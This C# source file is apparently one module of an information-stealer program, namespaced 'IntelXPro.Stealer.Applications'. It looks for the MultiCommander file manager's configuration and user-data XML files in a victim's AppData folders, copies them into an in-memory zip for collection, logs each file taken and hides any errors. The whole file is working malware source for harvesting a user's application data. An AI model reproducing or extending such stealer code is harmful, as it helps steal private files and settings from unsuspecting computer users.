using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class MultiCommander : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MultiCommander");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "MultiCommander");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "MultiCommander";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string configPath = Path.Combine(basePath, "Config");
                if (Directory.Exists(configPath))
                {
                    string[] configFiles = new string[]
                    {
                        "MultiCommander.xml",
                        "UserDefinedCommands.xml",
                        "FavoriteLocations.xml",
                        "FileTags.xml",
                        "FileColors.xml"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(configPath, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\MultiCommander\\{location}\\Config\\{configFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string[] xmlFiles = Directory.GetFiles(configPath, "*.xml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in xmlFiles.Take(15))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\MultiCommander\\{location}\\Config\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string userDataPath = Path.Combine(basePath, "UserData");
                if (Directory.Exists(userDataPath))
                {
                    string[] dataFiles = Directory.GetFiles(userDataPath, "*.xml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in dataFiles.Take(10))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\MultiCommander\\{location}\\UserData\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
